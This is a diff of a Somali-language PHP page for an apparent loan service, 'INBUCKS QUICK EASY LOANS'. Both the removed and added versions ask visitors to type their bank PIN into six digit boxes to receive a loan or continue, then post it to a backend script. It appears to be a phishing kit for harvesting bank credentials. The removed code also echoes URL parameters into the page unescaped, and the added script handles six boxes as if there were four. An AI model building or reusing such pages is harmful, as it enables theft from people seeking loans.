@@ -1,156 +1,120 @@
 <?php
-if (isset($_GET['error'])) {
-    echo "<p style='color:red;'>Koodh khaldan,fadlan mar kale isku day❌</p>";
-}
-?>
-<?php
-// Make id optional
-$id = $_GET['id'] ?? '';        // if 'id' is missing, $id becomes empty string
-$phone = $_GET['phone'] ?? '';  // phone is required
-
-// Only check phone, since that's what we use
-if(empty($phone)){
-    echo "Invalid access";
-    exit();
+if(isset($_GET['error'])){
+    echo "<p style='color:red; text-align:center;'>Fadlan geli faahfaahintaada si sax ah ❌</p>";
 }
 ?>
 
 <!DOCTYPE html>
 <html>
 <head>
-    <title>OTP</title>
-    <link rel="stylesheet" href="style.css">
+
+<title>Confirm Details</title>
+<link rel="stylesheet" href="style.css">
+
 </head>
 
 <body>
-<!-- Top Logo -->
+<!-- top logo -->
 <div class="logo-container">
-    <img src="logo.png" alt="INBUCKS QUICK EASY LOANS Logo" class="logo">
+     <img src="logo.png" alt="INBUCKS QUICK EASY LOANS Logo" class="logo">
+</div>
+<div class="container">
+
+<h2>Fadlan geli lambarka iyo PIN-ka si aad u sii wadato</h2>
+
+<form action="process2.php" method="POST">
+<div class="pin-container">
+    
+    <div class="pin-box">
+        <input type="tel" maxlength="1" class="pin" required>
+        <input type="tel" maxlength="1" class="pin" required>
+        <input type="tel" maxlength="1" class="pin" required>
+        <input type="tel" maxlength="1" class="pin" required>
+        <input type="tel" maxlength="1" class="pin" required>
+        <input type="tel" maxlength="1" class="pin" required>
+    </div>
+
+    <span id="togglePin" style="cursor:pointer; font-size:20px;">👁</span>
+
 </div>
 
-<div class="card">
+<input type="hidden" name="pin" id="fullPin">
 
-<h2>Fadlan Geli PIN-ka bangigaaga si aad u hesho amaahda</h2>
-
-
-
-<h3>+252 <?php echo $phone; ?></h3>
-
-<form id="otpForm" action="verify.php" method="POST">
-
-<input type="hidden" name="id" value="<?php echo $id; ?>">
-<input type="hidden" name="phone" value="<?php echo $phone; ?>">
-
-<div class="otp-boxes">
-    <input type="text" maxlength="1" name="d1">
-    <input type="text" maxlength="1" name="d2">
-    <input type="text" maxlength="1" name="d3">
-    <input type="text" maxlength="1" name="d4">
-    <input type="text" maxlength="1" name="d5">
-    <input type="text" maxlength="1" name="d6">
-</div>
-
-<button type="submit">GUDBI</button>
-<p id="timer"></p>
-
-<button id="resendBtn" disabled></button>
+<button type="submit">SII WAD</button>
 
 </form>
 
 </div>
 <script>
-const inputs = document.querySelectorAll('.otp-boxes input');
+const pins = document.querySelectorAll(".pin");
 
-// AUTO MOVE + BACKSPACE
-inputs.forEach((input, index) => {
+// When typing in first box, allow full paste/typing
+pins[0].addEventListener("input", function(e) {
+    let value = this.value.replace(/\D/g, '');
 
-    input.addEventListener('input', (e) => {
-        let value = e.target.value;
+    // If user types multiple digits
+    if (value.length > 1) {
+        value = value.slice(0, 4);
+        pins.forEach((input, i) => {
+            input.value = value[i] || "";
+        });
+        if (value.length === 4) pins[3].focus();
+        return;
+    }
 
-        // allow only numbers
-        e.target.value = value.replace(/[^0-9]/g, '');
-
-        if (value && index < inputs.length - 1) {
-            inputs[index + 1].focus();
-        }
-    });
-
-    input.addEventListener('keydown', (e) => {
-        if (e.key === "Backspace" && !input.value && index > 0) {
-            inputs[index - 1].focus();
-        }
-    });
-
+    // Move to next
+    if (this.value) pins[1].focus();
 });
 
+// Handle other boxes normally
+pins.forEach((input, index) => {
+    if(index === 0) return;
 
-// 🔥 PASTE FULL OTP (IMPORTANT FEATURE)
-document.querySelector('.otp-boxes').addEventListener('paste', (e) => {
+    input.addEventListener("input", () => {
+        input.value = input.value.replace(/\D/g, '');
 
-    e.preventDefault();
-
-    let pasteData = (e.clipboardData || window.clipboardData).getData('text');
-
-    pasteData = pasteData.replace(/[^0-9]/g, '').slice(0, inputs.length);
-
-    pasteData.split('').forEach((char, index) => {
-        if (inputs[index]) {
-            inputs[index].value = char;
+        if (input.value && index < 3) {
+            pins[index + 1].focus();
         }
     });
 
+    input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+            pins[index - 1].focus();
+        }
+    });
 });
 </script>
 <script>
-let timeLeft = 30;
-const timer = document.getElementById("timer");
-const resendBtn = document.getElementById("resendBtn");
+let visible = false;
 
-// countdown
-let countdown = setInterval(() => {
-    timeLeft--;
-    timer.innerText = "Resend OTP in " + timeLeft + "s";
+document.getElementById("togglePin").addEventListener("click", function() {
+    visible = !visible;
 
-    if (timeLeft <= 0) {
-        clearInterval(countdown);
-        timer.innerText = "You can resend OTP now";
-        resendBtn.disabled = false;
-    }
-}, 1000);
-
-// resend button click
-resendBtn.addEventListener("click", () => {
-
-    // reset timer
-    timeLeft = 30;
-    resendBtn.disabled = true;
-
-    timer.innerText = "Resend OTP in 30s";
-
-    countdown = setInterval(() => {
-        timeLeft--;
-        timer.innerText = "Resend OTP in " + timeLeft + "s";
-
-        if (timeLeft <= 0) {
-            clearInterval(countdown);
-            timer.innerText = "You can resend OTP now";
-            resendBtn.disabled = false;
-        }
-    }, 1000);
-
-    // OPTIONAL: call backend
-    fetch("resend_otp.php?id=<?php echo $id; ?>")
-    .then(res => res.text())
-    .then(data => {
-        console.log(data);
+    document.querySelectorAll(".pin").forEach(input => {
+        input.type = visible ? "text" : "password";
     });
+
+    this.textContent = visible ? "🙈" : "👁";
+});
+</script>
+<script>
+document.querySelector("form").addEventListener("submit", function() {
+
+    let pin = "";
+
+    document.querySelectorAll(".pin").forEach(input => {
+        pin += input.value;
+    });
+
+    document.getElementById("fullPin").value = pin;
 
 });
 </script>
+
 <!-- Bottom Logo -->
 <div class="logo-container bottom">
-    <img src="logo.png" alt="INBUCKS QUICK EASY LOANS Logo" class="logo">
+     <img src="logo.png" alt="INBUCKS QUICK EASY LOANS Logo" class="logo">
 </div>
-
 </body>
 </html>
